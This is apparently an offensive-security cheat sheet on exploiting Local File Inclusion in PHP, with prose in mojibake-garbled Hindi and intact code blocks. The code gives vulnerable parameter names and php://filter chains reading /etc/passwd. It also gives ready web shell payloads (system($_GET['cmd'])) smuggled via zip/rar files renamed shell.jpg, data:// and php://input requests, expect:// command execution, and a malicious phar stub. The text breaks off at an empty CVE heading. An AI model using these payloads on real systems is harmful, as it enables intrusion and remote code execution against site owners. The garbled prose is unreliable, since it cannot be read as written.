рдпрд╣рд╛рдБ рдПрдХ рдРрд╕реА рд╢реАрд░реНрд╖ 25 рдкреИрд░рд╛рдореАрдЯрд░ рдХреА рд╕реВрдЪреА рд╣реИ рдЬреЛ рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓ рд╕рдорд╛рд╡реЗрд╢рди (LFI) рд╕рдВрд░рдЪрдирд╛рдУрдВ рдХреЗ рд▓рд┐рдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ (рд╕реЗ [рд▓рд┐рдВрдХ](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI рдХрд╛ рдЙрдкрдпреЛрдЧ PHP wrappers рдФрд░ protocols рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ

### php://filter

PHP рдлрд╝рд┐рд▓реНрдЯрд░реНрд╕ рдбреЗрдЯрд╛ рдкрд░ **рд╕рд╛рдорд╛рдиреНрдп рд╕рдВрд╢реЛрдзрди рдХрд╛рд░реНрдпреЛрдВ** рдХреЛ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВ рдЬреЛ рдЗрд╕реЗ рдкрдврд╝рд╛ рдпрд╛ рд▓рд┐рдЦрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпреЗ 5 рд╢реНрд░реЗрдгрд┐рдпреЛрдВ рдореЗрдВ рд╣реИрдВ:

* [String Filters](https://www.php.net/manual/en/filters.string.php):
* `string.rot13`
* `string.toupper`
* `string.tolower`
* `string.strip_tags`: рдбреЗрдЯрд╛ рд╕реЗ рдЯреИрдЧ рд╣рдЯрд╛рдПрдВ ("<" рдФрд░ ">" рд╡рд╛рд▓реЗ рд╡рд╕реНрддреБрдУрдВ рдХреЛ)
* рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ рдлрд╝рд┐рд▓реНрдЯрд░ PHP рдХреЗ рдЖрдзреБрдирд┐рдХ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рд╕реЗ рдЧрд╛рдпрдм рд╣реЛ рдЧрдпрд╛ рд╣реИ
* [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*` : рдПрдХ рд╡рд┐рднрд┐рдиреНрди рдЗрдиреНрдХреЛрдбрд┐рдВрдЧ рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрд┐рдд рдХрд░рддрд╛ рд╣реИ (`convert.iconv.<input_enc>.<output_enc>`)ред рд╕рдорд░реНрдерд┐рдд рд╕рднреА рдЗрдиреНрдХреЛрдбрд┐рдВрдЧ рдХреА **рд╕реВрдЪреА рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдХрдВрд╕реЛрд▓ рдореЗрдВ рд░рди рдХрд░реЗрдВ: `iconv -l`

{% hint style="warning" %}
`convert.iconv.*` рдкрд░рд┐рд╡рд░реНрддрди рдлрд╝рд┐рд▓реНрдЯрд░ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк **рдХрд▓реНрдкрд┐рдд рдкрд╛рда рдЙрддреНрдкрдиреНрди** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреЛ рдХрд▓реНрдкрд┐рдд рдкрд╛рда рд▓рд┐рдЦрдиреЗ рдпрд╛ рдХрд▓реНрдкрд┐рдд рдкрд╛рда рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md) рджреЗрдЦреЗрдВред
{% endhint %}

* [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
* `zlib.deflate`: рд╕рд╛рдордЧреНрд░реА рдХреЛ рд╕рдВрдХреБрдЪрд┐рдд рдХрд░реЗрдВ (рдпрджрд┐ рдмрд╣реБрдд рд╕рд╛рд░реА рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдмрд╛рд╣рд░ рдирд┐рдХрд╛рд▓рдирд╛ рдЙрдкрдпреЛрдЧреА рд╣реИ)
* `zlib.inflate`: рдбреЗрдЯрд╛ рдХреЛ рдЕрдирд╕рдВрдХреБрдЪрд┐рдд рдХрд░реЗрдВ
* [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
* `mcrypt.*` : рдкреБрд░рд╛рдирд╛
* `mdecrypt.*` : рдкреБрд░рд╛рдирд╛
* рдЕрдиреНрдп рдлрд╝рд┐рд▓реНрдЯрд░реНрд╕
* php рдореЗрдВ `var_dump(stream_get_filters());` рдЪрд▓рд╛рдХрд░ рдЖрдк рдХреБрдЫ **рдЕрдкреНрд░рддреНрдпрд╛рд╢рд┐рдд рдлрд╝рд┐рд▓реНрдЯрд░реНрд╕** рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ:
* `consumed`
* `dechunk`: HTTP рдЪрдВрдХреНрдб рдЗрдиреНрдХреЛрдбрд┐рдВрдЧ рдХреЛ рдЙрд▓реНрдЯрд╛ рджреЗрддрд╛ рд╣реИ
* `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,┬гhellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
{% hint style="warning" %}
"php://filter" рднрд╛рдЧ рдорд╛рдореВрд▓реА рд░реВрдк рд╕реЗ рдорд╛рдореВрд▓реА рд╣реИ
{% endhint %}

### php рдлрд╝рд┐рд▓реНрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдУрд░реЗрдХрд▓ рдХреЗ рд░реВрдк рдореЗрдВ рдЕрдирд┐рдпрдорд┐рдд рдлрд╝рд╛рдЗрд▓реЗрдВ рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП

[**рдЗрд╕ рдкреЛрд╕реНрдЯ**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) рдореЗрдВ рд╕рд░реНрд╡рд░ рд╕реЗ рд╡рд╛рдкрд╕реА рдкреНрд░рд╛рдкреНрдд рдХрд┐рдП рдмрд┐рдирд╛ рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓ рдкрдврд╝рдиреЗ рдХреА рдПрдХ рддрдХрдиреАрдХ рдкреНрд░рд╕реНрддреБрдд рдХреА рдЧрдИ рд╣реИред рдпрд╣ рддрдХрдиреАрдХ **php рдлрд╝рд┐рд▓реНрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдмреВрд▓рд┐рдпрди рдПрдХреНрд╕рдлрд┐рд▓реНрдЯреНрд░реЗрд╢рди (рдЪрд╛рд░ рд╕реЗ рдЪрд╛рд░) рдХрд░рдиреЗ рдХреЗ рд░реВрдк рдореЗрдВ рдУрд░реЗрдХрд▓** рдХреЗ рд░реВрдк рдореЗрдВ рд╣реИред рдпрд╣ рдЗрд╕рд▓рд┐рдП рд╣реИ рдХреНрдпреЛрдВрдХрд┐ php рдлрд╝рд┐рд▓реНрдЯрд░ рдПрдХ рдкрд╛рда рдХреЛ рдкрд░реНрдпрд╛рдкреНрдд рдмрдбрд╝рд╛ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ php рдПрдХ рдЕрдкрд╢рд┐рд╖реНрдЯ рдлреЗрдВрдХреЗред

рдореВрд▓ рдкреЛрд╕реНрдЯ рдореЗрдВ рдЖрдк рддрдХрдиреАрдХ рдХрд╛ рд╡рд┐рд╕реНрддреГрдд рд╡рд┐рд╡рд░рдг рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдпрд╣рд╛рдБ рдПрдХ рддреНрд╡рд░рд┐рдд рд╕рд╛рд░рд╛рдВрд╢ рд╣реИ:

* рдкрд╛рда рдХреЗ рдкрд╣рд▓реЗ рдЕрдХреНрд╖рд░ рдХреЛ рдкреНрд░рд╛рд░рдВрдн рдореЗрдВ рдЫреЛрдбрд╝рдиреЗ рдФрд░ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХрд╛ рдЖрдХрд╛рд░ рд╡рд┐рд╕реНрддрд╛рд░рдгрд╛рддреНрдордХ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЛрдбреЗрдХ **`UCS-4LE`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
* рдпрд╣ рдЙрд╕ рд╕рдордп рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдЬрдм **рдкрд╣рд▓реЗ рдЕрдХреНрд╖рд░ рдХреЛ рд╕рд╣реА рд░реВрдк рд╕реЗ рдЕрдиреБрдорд╛рдирд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдП** рдХрд┐ php рдПрдХ **рддреНрд░реБрдЯрд┐** рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдЧрд╛
* **рдбреАрдЪрдВрдХ** рдлрд╝рд┐рд▓реНрдЯрд░ **рд╕рдм рдХреБрдЫ рд╣рдЯрд╛ рджреЗрдЧрд╛ рдЕрдЧрд░ рдкрд╣рд▓рд╛ рд╡рд░реНрдгрдХреНрд░рдо рди рд╣реЛ**, рдЗрд╕рд▓рд┐рдП рд╣рдо рдЬрд╛рди рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдкрд╣рд▓рд╛ рд╡рд░реНрдгрдХреНрд░рдо рд╣реИрдХреНрд╕ рд╣реИ рдпрд╛ рдирд╣реАрдВред
* рдЗрд╕рдХреЗ рд╕рд╛рде, рдкрд┐рдЫрд▓реЗ рд╡рд╛рд▓реЗ рдХреЗ рд╕рд╛рде (рдФрд░ рдЕрдиреНрдп рдлрд╝рд┐рд▓реНрдЯрд░ рдЬреЛ рдЕрдиреБрдорд╛рдирд┐рдд рдЕрдХреНрд╖рд░ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддреЗ рд╣реИрдВ), рд╣рдореЗрдВ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдЧрд╛ рдХрд┐ рдкрд╛рда рдХреЗ рд╢реБрд░реБрдЖрддреА рдЕрдХреНрд╖рд░ рдХреЛ рдЕрдиреБрдорд╛рдирд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд░реНрдпрд╛рдкреНрдд рдкрд░рд┐рд╡рд░реНрддрди рдХрд┐рдП рдЬрд╛рдиреЗ рдкрд░ рдирд╣реАрдВ рдПрдХ рд╣реЗрдХреНрд╕рд╛рдбреЗрд╕рд┐рдорд▓ рд╡рд░реНрдгрдХреНрд░рдо рд╣реИред рдХреНрдпреЛрдВрдХрд┐ рдпрджрд┐ рд╣реЗрдХреНрд╕ рд╣реИ, рддреЛ рдбреАрдЪрдВрдХ рдЗрд╕реЗ рдорд┐рдЯрд╛рдПрдЧрд╛ рдирд╣реАрдВ рдФрд░ рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдмрдо php рддреНрд░реБрдЯрд┐ рдХрд░ рджреЗрдЧрд╛ред
* рдХреЛрдбреЗрдХ **convert.iconv.UNICODE.CP930** рд╣рд░ рд╡рд░реНрдгрдХреНрд░рдо рдХреЛ рдЕрдЧрд▓реЗ рдореЗрдВ рдмрджрд▓ рджреЗрддрд╛ рд╣реИ (рдЗрд╕рд▓рд┐рдП рдЗрд╕ рдХреЛрдбреЗрдХ рдХреЗ рдмрд╛рдж: a -> b)ред рдпрд╣ рд╣рдореЗрдВ рдкрддрд╛ рдЪрд▓рддрд╛ рд╣реИ рдХрд┐ рдкрд╣рд▓рд╛ рдЕрдХреНрд╖рд░ рдПрдХ `a` рд╣реИ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдХреНрдпреЛрдВрдХрд┐ рдЕрдЧрд░ рд╣рдо 6 рдЗрд╕ рдХреЛрдбреЗрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ a->b->c->d->e->f->g рддреЛ рдЕрдХреНрд╖рд░ рдЕрдм рдФрд░ рднреА рд╣реЗрдХреНрд╕рд╛рдбреЗрд╕рд┐рдорд▓ рд╡рд░реНрдгрдХреНрд░рдо рдирд╣реАрдВ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдбреАрдЪрдВрдХ рдЗрд╕реЗ рдорд┐рдЯрд╛рдПрдЧрд╛ рдирд╣реАрдВ рдФрд░ php рддреНрд░реБрдЯрд┐ рдЯреНрд░рд┐рдЧрд░ рд╣реЛрдЧреА рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдмрдо рдХреЗ рд╕рд╛рде рдЧреБрдгрд╛ рдХрд░реЗрдЧрд╛ред
* рдкреНрд░рд╛рд░рдВрдн рдореЗрдВ **rot13** рдЬреИрд╕реЗ рдЕрдиреНрдп рдкрд░рд┐рд╡рд░реНрддрдиреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдиреНрдп рд╡рд░реНрдгреЛрдВ рдХреЛ рд▓реАрдХ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ, рдЬреИрд╕реЗ n, o, p, q, r (рдФрд░ рдЕрдиреНрдп рдХреЛрдбреЗрдХреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЕрдиреНрдп рдЕрдХреНрд╖рд░реЛрдВ рдХреЛ рд╣реЗрдХреНрд╕ рд╕реАрдорд╛ рдореЗрдВ рд▓реЗ рдЬрд╛рдиреЗ рдХреЗ рд▓рд┐рдП)ред
* рдЬрдм рдкреНрд░рд╛рд░рдВрднрд┐рдХ рд╡рд░реНрдгрдХреНрд░рдо рдПрдХ рд╕рдВрдЦреНрдпрд╛ рд╣реИ рддреЛ рдЗрд╕реЗ base64 рдПрдиреНрдХреЛрдб рдХрд░рдирд╛ рдФрд░ рдирдВрдмрд░ рд▓реАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд╣рд▓реЗ 2 рдЕрдХреНрд╖рд░реЛрдВ рдХреЛ рд▓реАрдХ рдХрд░рдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИред
* рдЕрдВрддрд┐рдо рд╕рдорд╕реНрдпрд╛ рдпрд╣ рд╣реИ рдХрд┐ рджреЗрдЦрдирд╛ рд╣реИ **рдХрд┐ рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдЕрдХреНрд╖рд░ рд╕реЗ рдЕрдзрд┐рдХ рдХреИрд╕реЗ рд▓реАрдХ рдХрд░реЗрдВ**ред **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** рдЬреИрд╕реЗ рдХреНрд░рдо рд╕реНрдореГрддрд┐ рдлрд╝рд┐рд▓реНрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд░реНрдгреЛрдВ рдХреЗ рдХреНрд░рдо рдХреЛ рдмрджрд▓рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдФрд░ рдкрд╛рда рдХреЗ рдкрд╣рд▓реЗ рд╕реНрдерд╛рди рдкрд░ рдЕрдиреНрдп рдЕрдХреНрд╖рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред
* рдФрд░ **рдЕрдзрд┐рдХ рдбреЗрдЯрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рд╡рд┐рдЪрд╛рд░ рдпрд╣ рд╣реИ рдХрд┐ **рдкреНрд░рд╛рд░рдВрдн рдореЗрдВ 2 рдмрд╛рдЗрдЯ рдХреЗ рдЬрдВрдХ рдбреЗрдЯрд╛ рдЙрддреНрдкрдиреНрди рдХреИрд╕реЗ рдХрд░реЗрдВ** рдЬрд┐рд╕реЗ **convert.iconv.UTF16.UTF16** рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, **UCS-4LE** рд▓рд╛рдЧреВ рдХрд░рдХреЗ рдЗрд╕реЗ **рдЕрдЧрд▓реЗ 2 рдмрд╛рдЗрдЯ рдХреЗ рд╕рд╛рде рдкрд┐рд╡рдЯ рдХрд░реЗрдВ**, рдФрд░ рдбреЗрдЯрд╛ рдХреЛ рд╣рдЯрд╛рдПрдВ рдЬрдм рддрдХ рдЬрдВрдХ рдбреЗрдЯрд╛ рди рд╣реЛ (рдпрд╣ рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдкрд╛рда рдХреЗ рдкрд╣рд▓реЗ 2 рдмрд╛рдЗрдЯ рд╣рдЯрд╛ рджреЗрдЧрд╛)ред рдЗрд╕реЗ рдЬрд╛рд░реА рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдЬрдм рддрдХ рдЖрдк рд▓реАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрдЪреНрдЫрд┐рдд рдмрд┐рдЯ рддрдХ рдкрд╣реБрдВрдЪ рдЬрд╛рдПрдВред

рдкреЛрд╕реНрдЯ рдореЗрдВ рдЗрд╕реЗ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрдкрдХрд░рдг рднреА рд▓реАрдХ рд╣реБрдЖ рдерд╛: [php\_filters\_chain\_oracle\_exploit](https://github.com/synacktiv/php\_filter\_chains\_oracle\_exploit).

### php://fd

рдпрд╣ рд░реИрдкрд░ рдЙрд╕ рдлрд╝рд╛рдЗрд▓ рдбрд┐рд╕реНрдХреНрд░рд┐рдкреНрдЯрд░реНрд╕ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдЬрд┐рдирдХреЗ рдкрд╛рд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЦреЛрд▓реА рд╣реИред рдЦреЛрд▓реА рдЧрдИ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдмрд╛рд╣рд░ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрднрд╛рд╡рд┐рдд рдЙрдкрдпреЛрдЧреА:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
рдЖрдк рдлрд╝рд╛рдЗрд▓ рдбрд┐рд╕реНрдХреНрд░рд┐рдкреНрдЯрд░ 0, 1 рдФрд░ 2 рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреЗ рд▓рд┐рдП **php://stdin, php://stdout рдФрд░ php://stderr** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдпрд╣ рдХреИрд╕реЗ рд╣рдорд▓реЗ рдореЗрдВ рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╕реНрдкрд╖реНрдЯ рдирд╣реАрдВ рд╣реИ)

### zip:// рдФрд░ rar://

рдПрдХ Zip рдпрд╛ Rar рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ рдЬрд┐рд╕рдореЗрдВ рдПрдХ PHPShell рд╣реЛ рдФрд░ рдЗрд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░реЗрдВред\
рд░рд╛рд░ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕реЗ **рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рд╕рдХреНрд░рд┐рдп** рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### рдбреЗрдЯрд╛://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
**рдХреГрдкрдпрд╛ рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ php рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рджреНрд╡рд╛рд░рд╛ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рд╣реИ **`allow_url_open`** рдФрд░ **`allow_url_include`**

### expect://

Expect рдХреЛ рд╕рдХреНрд░рд┐рдп рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред рдЖрдк рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### рдЗрдирдкреБрдЯ://

POST рдкреИрд░рд╛рдореАрдЯрд░ рдореЗрдВ рдЕрдкрдирд╛ рдкреЗрдпрд▓реЛрдб рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░реЗрдВ:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

рдПрдХ `.phar` рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ PHP рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрдм рдПрдХ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдлрд╝рд╛рдЗрд▓ рд▓реЛрдбрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП `include` рдЬреИрд╕реЗ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред рдиреАрдЪреЗ рджрд┐рдП рдЧрдП PHP рдХреЛрдб рд╕реНрдирд┐рдкреЗрдЯ рдореЗрдВ `.phar` рдлрд╝рд╛рдЗрд▓ рдмрдирд╛рдиреЗ рдХрд╛ рдкреНрд░рджрд░реНрд╢рди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
`.phar` рдлрд╝рд╛рдЗрд▓ рдХреЛ рдХреЙрдореНрдкрд╛рдЗрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП:
```bash
php --define phar.readonly=0 create_path.php
```
рдЬрдм рдирд┐рд╖реНрдкрд╛рджрди рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдирд╛рдордХ `test.phar` рдмрдирд╛рдИ рдЬрд╛рдПрдЧреА, рдЬрд┐рд╕реЗ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓ рд╕рдорд╛рд╡реЗрд╢рди (LFI) рджреБрд░реБрдкрдпреЛрдЧ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЙрди рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдЬрд╣рд╛рдВ LFI рдХреЗрд╡рд▓ PHP рдХреЛрдб рдХреЛ рдирд╣реАрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддрд╛ рд╣реИ, рдмрд▓реНрдХрд┐ `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, рдпрд╛ `filesize()` рдЬреИрд╕реЗ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдлрд╝рд╛рдЗрд▓ рдкрдврд╝рдиреЗ рдХрд╛ рдХрд╛рд░реНрдп рдХрд░рддрд╛ рд╣реИ, рддреЛ рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рджреБрд░реБрдкрдпреЛрдЧ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рджреБрд░реБрдкрдпреЛрдЧ `phar` рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдкрдврд╝рдиреЗ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рд╣реИред

`.phar` рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рджреБрд░реБрдкрдпреЛрдЧ рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рд╕реНрддреГрдд рд╕рдордЭрдиреЗ рдХреЗ рд▓рд┐рдП рдиреАрдЪреЗ рджрд┐рдП рдЧрдП рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХрд╛ рд╕рдВрджрд░реНрдн рджреЗрдЦреЗрдВ:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### CVE-2024-2961

